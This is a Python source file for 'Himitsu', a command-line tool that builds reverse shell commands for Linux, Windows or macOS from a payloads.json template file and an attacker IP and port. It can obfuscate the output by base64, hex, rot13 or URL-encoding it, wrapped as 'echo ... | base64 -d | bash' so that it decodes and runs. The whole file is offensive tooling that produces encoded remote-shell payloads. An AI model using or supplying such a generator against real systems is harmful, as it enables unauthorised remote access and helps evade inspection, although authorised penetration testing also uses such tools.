import os
import argparse
import base64
import sys
import ipaddress
import urllib.parse
import json
import random
import string
import codecs

banner = r"""
  ___ ___ .__        .__  __
 /   |   \|__| _____ |__|/  |_  ________ __
/    ~    \  |/     \|  \   __\/  ___/  |  \
\    Y    /  |  Y Y  \  ||  |  \___ \|  |  /
 \___|_  /|__|__|_|  /__||__| /____  >____/
       \/          \/              \/
                                      ~A1SBERG
"""

def load_payloads():
    with open('payloads.json', 'r') as f:
        return json.load(f)

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def is_valid_port(port):
    return 0 <= port <= 65535

def list_reverse_shells(os_category):
    payloads = load_payloads()
    if os_category in payloads:
        print(f"Available reverse shell types for {os_category.capitalize()}:")
        for shell_type in payloads[os_category]:
            print(f"- {shell_type}")
    else:
        print(f"[-] Invalid OS category: {os_category}")

def generate_reverse_shells(ip, port, os_category, shell_type, encode, payloads):
    if not is_valid_ip(ip):
        print(f"[-] Invalid IP address: {ip}")
        return
    if not is_valid_port(port):
        print(f"[-] Invalid port number: {port}. It should be between 0 and 65535.")
        return
    if os_category in payloads and shell_type in payloads[os_category]:
        shell_command = payloads[os_category][shell_type].format(ip, port)
        if encode == 'base64':
            shell_command = base64.b64encode(shell_command.encode()).decode()
            shell_command = f"echo {shell_command} | base64 -d | bash"
        elif encode == 'hex':
            shell_command = shell_command.encode().hex()
            shell_command = f"echo {shell_command} | xxd -r -p | bash"
        elif encode == 'rot13':
            shell_command = codecs.encode(shell_command, 'rot_13')
            shell_command = f"echo '{shell_command}' | rot13 | bash"
        elif encode == 'url':
            shell_command = urllib.parse.quote(shell_command)
        else:
            encode = 'None'
        print("[+] Payload Generated:")
        print("-" * 40)
        print(f" IP Address     : {ip}")
        print(f" Port           : {port}")
        print(f" OS Category    : {os_category.capitalize()}")
        print(f" Shell Type     : {shell_type}")
        print(f" Encoding       : {encode.capitalize()}")
        print("-" * 40)
        print(f"{shell_command}")
        print("-" * 40)
    else:
        print(f"[-] Invalid OS category or shell type: {os_category} - {shell_type}")

def main():
    payloads = load_payloads()
    print(banner)
    parser = argparse.ArgumentParser(description="Himitsu: Reverse Shell Generator for Lazy.")
    parser.add_argument('-ip', '--ipaddress', type=str, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, help='Target port number')
    parser.add_argument('-os', '--operating-system', type=str, help='Target operating system (linux, windows, macos)')
    parser.add_argument('-pl', '--payload', type=str, help='Payload for reverse shell')
    parser.add_argument('-l', '--list', type=str, help='List available reverse shell payload types for the specified OS')
    parser.add_argument('-enc', '--encode', type=str, help='Encode the payload in Base64 or URL')
    args = parser.parse_args()
    
    if args.list:
        list_reverse_shells(args.list.lower())
        return

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    if args.operating_system and args.payload and not args.port and not args.ipaddress or args.ipaddress and args.operating_system and args.payload and not args.port or args.operating_system and args.payload and args.port and not args.ipaddress:
        print("[-] Specify the Port and IP Address")
        sys.exit(1)
    if args.payload and not args.operating_system or args.operating_system and not args.payload:
        print("[-] Specify the Operating System or the Payload")
        sys.exit(1)
    generate_reverse_shells(args.ipaddress, args.port, args.operating_system, args.payload, args.encode, payloads)

if __name__ == '__main__':
    main()

